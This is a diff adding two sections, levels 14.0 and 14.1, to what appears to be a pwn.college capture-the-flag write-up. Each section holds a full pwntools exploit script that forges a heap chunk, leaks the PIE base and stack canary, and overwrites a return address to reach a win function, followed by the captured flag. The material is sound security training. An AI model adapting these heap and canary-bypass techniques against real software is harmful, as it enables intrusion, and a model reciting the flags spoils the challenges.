@@ -3068,3 +3068,263 @@ if __name__ == "__main__":
 ## Flag
 
 :spoiler[`pwn.college{AzMm2HpvBwKXfmMU3AoN5SEUd4H.0lN5MDL5cTNxgzW}`]
+
+# Level 14.0
+
+## Information
+
+- Category: Pwn
+
+## Description
+
+> Leverage TCACHE exploits to obtain the flag.
+
+## Write-up
+
+有啥不一样吗？？我之前也是这么做的……
+
+## Exploit
+
+```python
+#!/usr/bin/env python3
+
+from pwn import (
+    args,
+    context,
+    flat,
+    process,
+    raw_input,
+    remote,
+)
+
+
+FILE = "/challenge/babyheap_level14.0"
+HOST, PORT = "localhost", 1337
+
+context(log_level="debug", binary=FILE, terminal="kitty")
+
+elf = context.binary
+
+
+def malloc(idx, size):
+    target.sendlineafter(b": ", b"malloc")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+    target.sendlineafter(b"Size: ", str(size).encode())
+
+
+def free(idx):
+    target.sendlineafter(b": ", b"free")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+
+
+def echo(idx, offset):
+    target.sendlineafter(b": ", b"echo")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+    target.sendlineafter(b"Offset: ", str(offset).encode())
+
+
+def scanf(idx, data):
+    target.sendlineafter(b": ", b"scanf")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+    target.sendline(data)
+
+
+def stack_free():
+    target.sendlineafter(b": ", b"stack_free")
+
+
+def stack_scanf(data):
+    target.sendlineafter(b": ", b"stack_scanf")
+    target.sendline(data)
+
+
+def quit():
+    target.sendlineafter(b": ", b"quit")
+
+
+def launch():
+    global target
+    if args.L:
+        target = process(FILE)
+    else:
+        target = remote(HOST, PORT)
+
+
+def main():
+    launch()
+
+    payload = flat(
+        b"A" * 0x30,
+        0,
+        0x401,
+    )
+    stack_scanf(payload)
+    stack_free()
+
+    malloc(0, 0x3F0)
+    echo(0, 0x18)
+    target.recvuntil(b"Data: ")
+    pie = int.from_bytes(target.recvline().strip(), "little") - 0x22DD
+    win = pie + 0x1A22
+
+    echo(0, 0x49)
+    target.recvuntil(b"Data: ")
+    canary = int.from_bytes(target.recvline().strip().rjust(0x8, b"\x00"), "little")
+
+    target.success(f"pie: {hex(pie)}")
+    target.success(f"win: {hex(win)}")
+    target.success(f"canary: {hex(canary)}")
+
+    payload = flat(
+        b"A" * 0x48,
+        canary,
+        0,
+        win,
+    )
+    raw_input("DEBUG")
+    scanf(0, payload)
+    quit()
+
+    target.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+## Flag
+
+:spoiler[`pwn.college{wQRsnVfxcvBTDBM8-XLGPXFLyGF.01N5MDL5cTNxgzW}`]
+
+# Level 14.1
+
+## Information
+
+- Category: Pwn
+
+## Description
+
+> Leverage TCACHE exploits to obtain the flag.
+
+## Write-up
+
+参见 [Level 14.0](#level-140)。
+
+:::important
+Theres a [golden meme](https://cdn.discordapp.com/attachments/750836456813101130/1293074901070118942/8mb.video-xK2-TmDcop4s.mp4?ex=68e5ef58&is=68e49dd8&hm=cec4f1c226f3911a933727a3d35ae974ce2491355f662a554d34fada240b9bed&), also, ask this man `isspace`。
+:::
+
+~_总结，热心群友们个个都是谜语大师，相信他们给出的 tips 绝对是正确，够用的 xD_~
+
+## Exploit
+
+```python
+#!/usr/bin/env python3
+
+from pwn import (
+    args,
+    context,
+    flat,
+    process,
+    raw_input,
+    remote,
+)
+
+
+FILE = "/challenge/babyheap_level14.1"
+HOST, PORT = "localhost", 1337
+
+context(log_level="debug", binary=FILE, terminal="kitty")
+
+elf = context.binary
+
+
+def malloc(idx, size):
+    target.sendlineafter(b": ", b"malloc")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+    target.sendlineafter(b"Size: ", str(size).encode())
+
+
+def free(idx):
+    target.sendlineafter(b": ", b"free")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+
+
+def echo(idx, offset):
+    target.sendlineafter(b": ", b"echo")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+    target.sendlineafter(b"Offset: ", str(offset).encode())
+
+
+def scanf(idx, data):
+    target.sendlineafter(b": ", b"scanf")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+    target.sendline(data)
+
+
+def stack_free():
+    target.sendlineafter(b": ", b"stack_free")
+
+
+def stack_scanf(data):
+    target.sendlineafter(b": ", b"stack_scanf")
+    target.sendline(data)
+
+
+def quit():
+    target.sendlineafter(b": ", b"quit")
+
+
+def launch():
+    global target
+    if args.L:
+        target = process(FILE)
+    else:
+        target = remote(HOST, PORT)
+
+
+def main():
+    launch()
+
+    payload = flat(
+        b"A" * 0x30,
+        0,
+        0x401,
+    )
+    stack_scanf(payload)
+    stack_free()
+
+    malloc(0, 0x3F0)
+    echo(0, 0x18)
+    target.recvuntil(b"Data: ")
+    pie = int.from_bytes(target.recvline().strip(), "little") - 0x1B8D
+    win = pie + 0x1409 + 5
+
+    echo(0, 0x49)
+    target.recvuntil(b"Data: ")
+    canary = int.from_bytes(target.recvline().strip().rjust(0x8, b"\x00"), "little")
+
+    target.success(f"pie: {hex(pie)}")
+    target.success(f"win: {hex(win)}")
+    target.success(f"canary: {hex(canary)}")
+
+    payload = flat(
+        b"A" * 0x48,
+        canary,
+        0,
+        win,
+    )
+    raw_input("DEBUG")
+    scanf(0, payload)
+    quit()
+
+    target.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+## Flag
+
+:spoiler[`pwn.college{89yuVXIylEt3d84DgpKZsDAT2ew.0FO5MDL5cTNxgzW}`]
